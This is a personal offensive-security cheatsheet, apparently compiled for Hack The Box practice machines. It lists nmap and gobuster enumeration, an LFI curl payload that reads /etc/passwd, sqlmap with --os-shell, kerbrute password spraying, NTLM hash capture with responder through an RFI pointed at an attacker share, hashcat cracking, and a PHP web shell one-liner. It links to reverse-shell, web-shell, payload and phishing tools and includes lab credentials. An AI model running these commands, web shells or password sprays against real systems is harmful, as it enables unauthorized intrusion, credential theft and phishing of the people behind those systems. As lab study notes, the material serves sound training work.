# CIBERSECURITY CHEATSHEET - polgs
# Links
https://start.me/p/vjBeQ6/cybersecurity
https://github.com/arainho/awesome-api-security




# Shells
## Interactive reverse shell windows
https://github.com/antonioCoco/ConPtyShell

https://www.revshells.com
https://github.com/Hackplayers/evil-winrm
r57 shells:
c99 shell php shell
https://www.r57shell.net/index.php

Fav PHP SHELL:
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
![image](https://user-images.githubusercontent.com/19478700/215343220-78d903d9-092d-4269-8d59-11eeb6fa3f79.png)
e.g. Afterwards uplad netcat

# Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
https://github.com/payloadbox/sql-injection-payload-list/



# INITIAL SCANS
## ping
**Ping 1 packet:**
```s
ping -c 1 
```
linux -> 64 ttl
windows -> 128 ttl
## nmap
**Scan fast and easy:**
```s
sudo nmap -p- 10.129.156.47 -vvv 
```


**Scan all ports and save to nmap/allPorts (Folder must exist):**
```s
nmap -p- -oA nmap/allPorts 10.129.156.47
```

**BIG GUNS NMAP**
```s
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.101.26 -oG allPorts | grep port
```

**Scan versions and scripts:**
```s
nmap -sV -sC -oA nmap/search
```
**Scan fast and loud:**
```s
nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
```
**Scan udp ports:**
```s
sudo nmap -p 1-500 -sU -T4 10.10.11.152 -Pn
```

# Firewalls
![image](https://user-images.githubusercontent.com/19478700/217123333-021267f1-a9ab-48eb-bed1-c4444d11ba8b.png)
Test if there is firewall filtered vs unfiltered

# WEB ENUMERATION
## gobuster
**Directory enumeration:**
```s
gobuster dir --url artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25  > gobuster_dir.txt
```
```s
gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>
```
```s
gobuster dir -u http://workers.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html
```
**Find subdomains using:**
```s
wfuzz -c -w /usr/share/wordlists/subdomains-top1million-110000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
``` 
change --hl to hide packets of specific length
```s
gobuster dns -t 30 -w /usr/share/wordlists/subdomains-top1million-110000.txt -d artcorp.htb
```
```s
gobuster vhost -w /usr/share/wordlists/subdomains-top1million-110000.txt -u http://thetoppers.htb
```
Optionally use "--append-domain" flag
```s
gobuster dns -d <domain> -w <word_list.txt> -i
```
```s
gobuster dns -d workers.htb -w /home/username/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i
```
**API endpoint enumeration:**
```s
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://10.10.11.244:3000/FUZZ" --hw 7
```

**Optional**
Use dns proxy to have wildcards on et/hosts (*.pol.com)
https://github.com/hubdotcom/marlon-tools/blob/master/tools/dnsproxy/dnsproxy.py
## nmap
**fast enum:**
```s
nmap --script http-enum -p80 10.129.95.187
```
## wfuzz
**Enum filename:**
```s
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.10/FUZZ.php
```
**Testing php parameter for LFI:**
```s
wfuzz -c --hw=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://10.10.10.10/login.php?FUZZ=/etc/passwd"
```
***Decode Payload***
```s
curl -s -X GET "http://10.10.10.10/login.php?login=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d; echo
```
#### Curl investigate service
![image](https://user-images.githubusercontent.com/19478700/227300117-5b7729d2-89fa-4e3d-a173-3eddd182b8f7.png)

## Online tools
whatweb
whappalizer

# Web Exploitation

#AWS Amazon S3
```s
aws configure
```
We can list all of the S3 buckets hosted by the server by using the ls command.
```s
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
We can also use the ls command to list objects and common prefixes under the specified bucket.
```s
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
## Parameter injection

## NoSQL
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#tools
![image](https://user-images.githubusercontent.com/19478700/216854327-26df334a-9923-410e-801e-116df26a3dcb.png)


## sqlmap
```s
GET request
sqlmap -u http://10.129.7.81/f
hboard.php?search=a -p id

sqlmap -u http://site-to-test.com/test.php?id=1*

-u: URL to scan

-p: parameter to scan

*: Parameter to scan (if -p switch is not provided)

POST request
We can provide the data being passed in the POST request body to scan by the SQLMap tool.

sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user

–data = POST data

PHP + SQL parameter (with cookie authentification)
sqlmap --cookie=PHPSESSID=0r7rr0vcsrekau1453acmvdrg5 --os-shell -u http://10.129.7.81/dashboard.php?search=a
```
**Use --os-shell Prompt for an interactive operating system shell**

SQLinjection in login:
Save request as file from burpsuite
![image](https://user-images.githubusercontent.com/19478700/215235215-5f998e1d-4cbc-4359-b369-a24b05a59384.png)
If File permission is available we can red files on te FS
![image](https://user-images.githubusercontent.com/19478700/215235347-475e8017-49f6-4470-9f21-c586e3e6ce57.png)
delete file to check privileges

(ippsec - trick)

### Test req captured with burpsuite (only one parameter)
 ```bash
 sqlmap -r admin.req -p total_service --batch
```

# SMB Active Directory

## Enumeration: 
### Shares
![image](https://user-images.githubusercontent.com/19478700/214690302-187aaf2a-b88e-4461-ad92-c8e5241239b2.png)

![image](https://user-images.githubusercontent.com/19478700/214690049-e84959e2-77d8-4843-b0cc-3aa2b17b1c50.png)

Get basic information on shares:
```s
cme smb IPADDR
```
```s
nmap --script=smb-enum-shares -p "139,445" 
```
```s
smbclient -N -L
```
```s
smbclient -L //10.10.11.187/ -U 'svc_apache' -p 'S@Ss!K@*t13'
``` 
```s
smbmap -H 10.10.11.152
```
![image](https://user-images.githubusercontent.com/19478700/213701493-aea51ee8-7705-4d1c-90e0-b2899c99ff67.png)

See what shares can a user write to:
```s
impacket-psexec flight.htb/svc_apache@flight.htb
```


### Users
```s
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
```
get user perms:
![image](https://user-images.githubusercontent.com/19478700/215343484-a1ecf120-6ff2-4d4c-8645-e54ad367e00e.png)
ImpersonatePriv can be exploited using potato
**Kerbrute**

Enumerate users:
```s
./kerbrute_linux_amd64 userenum --dc IPADD -d URL users.txt
```
Password Spray: Test a single password against a list of users
```s
./kerbrute_linux_amd64 passwordspray -d URL users.txt 'password123'
```
Possible errors:
Check for clock (+400.)
```s
ntpdate -q IP
```
Fix:
```s
sudo date -s 01:22
ntpdate IP
date
```
Try password on user list:
 User Spray
 ```s
crackmapexec smb flight.htb -u ../users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

## Access share
### smbclient
smbclient \\\\10.129.95.187\\backups
-> cd, ls get ....
Using username and pass:
![image](https://user-images.githubusercontent.com/19478700/215273350-bf5c6ac9-6068-4e8c-8d25-c28892f1f6e2.png)
Connect using password:
evil-winrm -i 10.129.228.204 -u Administrator -p 'badminton'

![image](https://user-images.githubusercontent.com/19478700/214691178-b4aaf701-efda-4d83-97b2-9143d05be73c.png)


conncet using cert and priv key:

## Get NTLM hash
![image](https://user-images.githubusercontent.com/19478700/214714186-e3876353-c3fe-4cd1-99e8-789f7135cea5.png)
![image](https://user-images.githubusercontent.com/19478700/214714312-f5b2151e-a0a4-4454-b329-a59532432865.png)
we can also use responder to listen for any attempt to connect to our share to get the hash
for example in an RFI we can make te web service acces the share by visiting the link :
http://school.flight.htb/index.php?view=//10.10.16.82/test
```s
responder -I tun0 -wPv
```
### Crack NTLM:
```s
hashcat -a 0 -m 5600 hash_c.bum /usr/share/wordlists/rockyou.txt
```

### Places to steal ntlm
https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini

## RunaCs
an utility to run specific processes with different permissions than the user's current logon provides
https://github.com/antonioCoco/RunasCs/tree/master


## Host share server
![image](https://user-images.githubusercontent.com/19478700/214715933-ca7cdb35-89da-4b7b-8a53-f5ce63e1c582.png)
#### to copy files to share:
![image](https://user-images.githubusercontent.com/19478700/214716094-ff65b350-30a0-4c31-a8b2-beee12dab2dc.png)

## BloodHound
Tool used to gather and display information about a domain using GUI
![image](https://user-images.githubusercontent.com/19478700/214720832-ef9775cd-160a-4975-a4d6-902d768ed772.png)


## Post ex
### C# offensive tools
https://github.com/Flangvik/SharpCollection
eg sharphound -> bloodhound AD rights and relations

# Privesc
Ruby YAML deserialization
https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/



# Cracking
## Crack ssh ftp mysql users using wordlists:
cme ->Crackmapexec

## FTP
### Test ftp user wordlist using hydra:
![image](https://user-images.githubusercontent.com/19478700/211882774-b0a7dab7-2da4-4195-a7e9-230ce8a87c34.png)


## Zips:
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt


Cracking pfx:
pfx2john legacyy_dev_auth.pfx > pfx_john_legacy.hash
john -w=/usr/share/wordlists/rockyou.txt pfx_john_legacy.hash


# Terminal Ninja
## grep
**Filter txt from some words:**
```s
cat file.txt | grep -v 'Image\|Manager'
```
**Filter txt from endlines:**
```s
cat file.txt | grep .
```

## PHP
**Php one liner tat executes parameter commands:**
shell.php:
```php
<?php system($_GET["cmd"]); ?>
``` 
http://thetoppers.htb/shell.php?cmd=id
The response from the server contains the output of the OS command id

## Log4j
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md


# Social Engineering
## Emails from console
![image](https://user-images.githubusercontent.com/19478700/214691713-035aa13f-7199-46d4-94b8-bebba78af555.png)
##Gophish
https://getgophish.com/

# OSINT
https://intelx.io
https://www.dehashed.com
https://github.com/jivoi/awesome-osint
https://github.com/sherlock-project/sherlock
https://github.com/twintproject/twint
https://github.com/mxrch/GHunt
https://github.com/soxoj/maigret
https://github.com/Datalux/Osintgram
https://tineye.com
https://www.shodan.io
https://chrome.google.com/webstore/detail/crowdtangle-link-checker/klakndphagmmfkpelfkgjbkimjihpmkh
https://start.me/p/QRqE7r/osint


# Dasboard
https://cybermap.kaspersky.com
https://trends.google.com/trends/hottrends/visualize?nrow=5&ncol=5
https://onemilliontweetmap.com
https://start.me/p/wMPxqX/cyber-threat-intelligence

<iframe width="640" height="640" src="https://cybermap.kaspersky.com/en/widget/dynamic/dark" frameborder="0">



# Dictionary Generation
```s
cewl
```
wordlist generation
https://github.com/D4Vinci/elpscrk
https://github.com/r3nt0n/bopscrk


http://wordlists.assetnote.io/



# RFID
https://github.com/RfidResearchGroup
https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/commands.md
https://github.com/carlospolop/hacktricks/blob/master/radio-hacking/pentesting-rfid.md
https://www.youtube.com/watch?v=n1Xt-1ZmjM0
Precompiled software avaiable at tools prox.7z

